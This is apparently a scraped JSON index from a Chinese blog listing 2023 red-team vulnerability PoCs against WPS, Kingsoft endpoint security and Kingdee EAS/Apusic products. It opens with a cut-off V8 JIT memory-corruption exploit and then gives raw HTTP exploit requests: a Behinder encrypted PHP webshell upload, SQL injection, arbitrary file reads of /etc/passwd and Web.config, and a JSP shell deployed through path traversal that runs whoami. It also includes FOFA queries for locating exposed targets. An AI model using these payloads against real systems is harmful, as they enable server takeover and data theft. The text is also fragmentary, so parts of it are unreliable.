strict\";b.a.call(arguments,b);return arguments[a];'); J.prototype.a = new Function('a', 'a.b(0,a)'); J.prototype.b = new Function( 'a', 'b', 'b.c();if(a){' + 'g++;'.repeat(70) + '}'); J.prototype.c = function() { if (optim) { var z = C(3); var p = C(3); z[0] = 0; e = {M: z, C: p}; } }; var a = new J(); // jit optim if (bug) { for (var V = 0; 1E4 \u003e V; V++) { opt(0 == V % 4 ? 1 : 4, a, 1); } } optim = true; opt(1, a, 1); return e; } e1 = foo(false); e2 = foo(true); delete e2.M[0]; let hole = e2.C[0]; let map = new Map(); map.set('asd', 8); map.set(hole, 0x8); map.delete(hole); map.delete(hole); map.delete(\"asd\"); map.set(0x20, \"aaaa\"); let arr3 = new Array(0); let arr4 = new Array(0); let arr5 = new Array(1); let oob_array = []; oob_array.push(1.1); map.set(\"1\", -1); let obj_array = { m: 1337, target: gc }; let ab = new ArrayBuffer(1337); let object_idx = undefined; let object_idx_flag = undefined; let max_size = 0x1000; for (let i = 0; i \u003c max_size; i++) { if (d2u(oob_array[i])[0] === 0xa72) { object_idx = i; object_idx_flag = 1; break; }if (d2u(oob_array[i])[1] === 0xa72) { object_idx = i + 1; object_idx_flag = 0; break; } } function addrof(obj_para) { obj_array.target = obj_para; let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1; obj_array.target = gc; return addr; } function fakeobj(addr) { let r8 = d2u(oob_array[object_idx]); if (object_idx_flag === 0) { oob_array[object_idx] = u2d(addr, r8[1]); }else { oob_array[object_idx] = u2d(r8[0], addr); } return obj_array.target; } let bk_idx = undefined; let bk_idx_flag = undefined; for (let i = 0; i \u003c max_size; i++) { if (d2u(oob_array[i])[0] === 1337) { bk_idx = i; bk_idx_flag = 1; break; }if (d2u(oob_array[i])[1] === 1337) { bk_idx = i + 1; bk_idx_flag = 0; break; } } let dv = new DataView(ab); function get_32(addr) { let r8 = d2u(oob_array[bk_idx]); if (bk_idx_flag === 0) { oob_array[bk_idx] = u2d(addr, r8[1]); } else { oob_array[bk_idx] = u2d(r8[0], addr); } let val = dv.getUint32(0, true); oob_array[bk_idx] = u2d(r8[0], r8[1]); return val; } function set_32(addr, val) { let r8 = d2u(oob_array[bk_idx]); if (bk_idx_flag === 0) { oob_array[bk_idx] = u2d(addr, r8[1]); } else { oob_array[bk_idx] = u2d(r8[0], addr); } dv.setUint32(0, val, true); oob_array[bk_idx] = u2d(r8[0], r8[1]); } function write8(addr, val) { let r8 = d2u(oob_array[bk_idx]); if (bk_idx_flag === 0) { oob_array[bk_idx] = u2d(addr, r8[1]); } else { oob_array[bk_idx] = u2d(r8[0], addr); } dv.setUint8(0, val); } let fake_length = get_32(addrof(oob_array)+12); set_32(get_32(addrof(oob_array)+8)+4,fake_length); let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128, 128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128, 128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0 ,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); let wasm_mod = new WebAssembly.Module(wasm_code); let wasm_instance = new WebA","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1wps-rce/:1:0","tags":["2023hw漏洞"],"title":"金山WPS RCE","uri":"/%E9%87%91%E5%B1%B1wps-rce/"},{"categories":["2023hw"],"content":"```\rPOST /inter/software_relation.php HTTP/1.1 Host: 192.168.249.137:6868 Content-Length: 1557 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://192.168.249.137:6868 Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryxRP5VjBKdqBrCixM User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“toolFileName” ../../datav.php ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“toolDescri” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“id” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“version” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“sofe_typeof” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“fileSize” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“param” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“toolName” ——WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=“toolImage”; filename=“3.php” Content-Type: image/png \u003c?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; //rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9-software_relation.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金山终端安全系统V9 software_relation.php任意文件上传漏洞","uri":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9-software_relation.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金山终端安全系统V9.0 SQL注入漏洞 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金山终端安全系统V9.0 SQL注入漏洞","uri":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa查询语法 app=\"金山终端安全系统V9.0Web控制台\" title==\"用户登录-金山终端安全系统V9.0Web控制台\" ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"金山终端安全系统V9.0 SQL注入漏洞","uri":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"影响版本 金山终端安全系统 V9.0 \u003c V9.SP1.E1008 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"金山终端安全系统V9.0 SQL注入漏洞","uri":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST /inter/update_software_info_v2.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: ip:port Content-Length: 81 type=--1E0union/**/se#lect-1E0,2,1,user(),5,6,7,8--\u0026key=123\u0026pageCount=1\u0026curPage=1 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"金山终端安全系统V9.0 SQL注入漏洞","uri":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金山终端安全系统V9任意文件上传漏洞 POST /inter/software_relation.php HTTP/1.1 Host: 192.168.249.137:6868 Content-Length: 1557 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://192.168.249.137:6868 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxRP5VjBKdqBrCixM User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolFileName\" ../../datav.php ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolDescri\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"id\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"version\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"sofe_typeof\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"fileSize\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"param\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolName\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolImage\"; filename=\"3.php\" Content-Type: image/png \u003c?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; //rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1\u002615]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?\u003e ------WebKitFormBoundaryxRP5VjBKdqBrCixM ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金山终端安全系统V9任意文件上传漏洞","uri":"/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9Fv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 金盘 微信管理平台 getsysteminfo 未授权访问漏洞\r","date":"2023-12-08","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金盘 微信管理平台 getsysteminfo 未授权访问漏洞","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限 ","date":"2023-12-08","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"金盘 微信管理平台 getsysteminfo 未授权访问漏洞","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 金盘 微信管理平台 ","date":"2023-12-08","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"金盘 微信管理平台 getsysteminfo 未授权访问漏洞","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 title=“微信管理后台” \u0026\u0026 icon_hash=“116323821” ","date":"2023-12-08","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"金盘 微信管理平台 getsysteminfo 未授权访问漏洞","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC /admin/weichatcfg/getsysteminfo ","date":"2023-12-08","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"金盘 微信管理平台 getsysteminfo 未授权访问漏洞","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"1. ```\r/K3WEB/CRM/WEBSERVICE/CusShareService.asmx ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6-k3erp-%E7%B3%BB%E7%BB%9F-cusshareservice-sql-%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"金蝶 K3ERP 系统 CusShareService SQL 注入","uri":"/%E9%87%91%E8%9D%B6-k3erp-%E7%B3%BB%E7%BB%9F-cusshareservice-sql-%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" \u0026\u0026 body=\"金蝶\") ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6-eas-easwebclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金蝶-EAS easWebClient 任意文件下载漏洞","uri":"/%E9%87%91%E8%9D%B6-eas-easwebclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Poc GET /easWebClient/bin/lib/config.jar HTTP/1.1 Host: 106.75.115.79 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip GET /easWebClient/bin/config.jar HTTP/1.1 Host: eas.only-china.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6-eas-easwebclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"金蝶-EAS easWebClient 任意文件下载漏洞","uri":"/%E9%87%91%E8%9D%B6-eas-easwebclient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金蝶EAS myUploadFile任意文件上传 ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6eas-myuploadfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw漏洞"],"title":"金蝶EAS myUploadFile任意文件上传","uri":"/%E9%87%91%E8%9D%B6eas-myuploadfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"Kingdee-EAS\" ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6eas-myuploadfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["2023hw漏洞"],"title":"金蝶EAS myUploadFile任意文件上传","uri":"/%E9%87%91%E8%9D%B6eas-myuploadfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"POC POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1 Host: 127.0.0.1 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx Content-Length: 205 ------WebKitFormBoundarySq4lDnabv8CwHfvx Content-Disposition: form-data; name=\"myFile\"; filename=\"test.jsp\" Content-Type: text/html \u003c%out.println(\"test\");%\u003e ------WebKitFormBoundarySq4lDnabv8CwHfvx-- jsp路径： http://127.0.0.1/easportal/buffalo/../test.jsp ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6eas-myuploadfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":["2023hw漏洞"],"title":"金蝶EAS myUploadFile任意文件上传","uri":"/%E9%87%91%E8%9D%B6eas-myuploadfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"```\rPOST /easadmin/downloadLogFileServlet HTTP/1.1 Host: Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 20 filePath=/etc/passwd ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6eas%E9%83%A8%E5%88%86%E7%89%88%E6%9C%AC-downloadlogfileservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:0:0","tags":["2023hw"],"title":"金蝶eas部分版本 downloadLogFileServlet 任意文件读取","uri":"/%E9%87%91%E8%9D%B6eas%E9%83%A8%E5%88%86%E7%89%88%E6%9C%AC-downloadlogfileservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"Apusic应用服务器\" ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6kingdee%E5%A4%A9%E7%87%95apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-deployapp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金蝶Kingdee天燕Apusic应用服务器 deployApp 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6kingdee%E5%A4%A9%E7%87%95apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-deployapp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc 金蝶Apusic应用服务器是国内第一个遵循J2EE标准的自有知识产权的纯Java应用服务器。金蝶Apusic应用服务器 deployApp 接口存在任意文件上传漏洞，攻击者可通过双斜杠绕过鉴权并上传恶意压缩包接管服务器权限xxxxxxxxxx POST /admin//protect/application/deployApp HTTP/1.1 Host: 219.145.189.3:6080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryd9acIBdVuqKWDJbd Accept-Encoding: gzip Content-Length: 1653 ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"appName\" 111 ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"deployInServer\" false ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"clientFile\"; filename=\"evil.zip\" Content-Type: application/x-zip-compressed PK\u0003\u0004\u0014../../../../applications/default/public_html/shell2.jspPK\u0005\u0006 ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"archivePath\" ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"baseContext\" ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"startType\" auto ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"loadon\" ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"virtualHost\" ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"allowHosts\" ------WebKitFormBoundaryd9acIBdVuqKWDJbd Content-Disposition: form-data; name=\"denyHosts\" ------WebKitFormBoundaryd9acIBdVuqKWDJbd-- GET /shell2.jsp?pwd=admin\u0026cmd=whoami HTTP/1.1 Host: 219.145.189.3:6080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6kingdee%E5%A4%A9%E7%87%95apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-deployapp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"金蝶Kingdee天燕Apusic应用服务器 deployApp 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6kingdee%E5%A4%A9%E7%87%95apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-deployapp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Exp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 98 {\"hostinfo\":\"http://219.145.189.3:6080\",\"vulfile\":\"CVD-2023-1207.go\",\"expparams\":{\"cmd\":\"whoami\"}} `` ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6kingdee%E5%A4%A9%E7%87%95apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-deployapp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"金蝶Kingdee天燕Apusic应用服务器 deployApp 任意文件上传漏洞","uri":"/%E9%87%91%E8%9D%B6kingdee%E5%A4%A9%E7%87%95apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-deployapp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"# 金蝶OA 云星空 CommonFileServer 任意文件读取漏洞\r","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金蝶OA 云星空 CommonFileServer 任意文件读取漏洞","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 金蝶OA 云星空 CommonFileServer接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件，进一步攻击服务器 ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"金蝶OA 云星空 CommonFileServer 任意文件读取漏洞","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 金蝶OA 云星空 ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"金蝶OA 云星空 CommonFileServer 任意文件读取漏洞","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 app=“金蝶云星空-管理中心” ","date":"2023-12-08","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"金蝶OA 云星空 CommonFileServer 任意文件读取漏洞","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC /CommonFileServer/c%3a%2fwindows%2fwin.ini /CommonFileServer/C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config 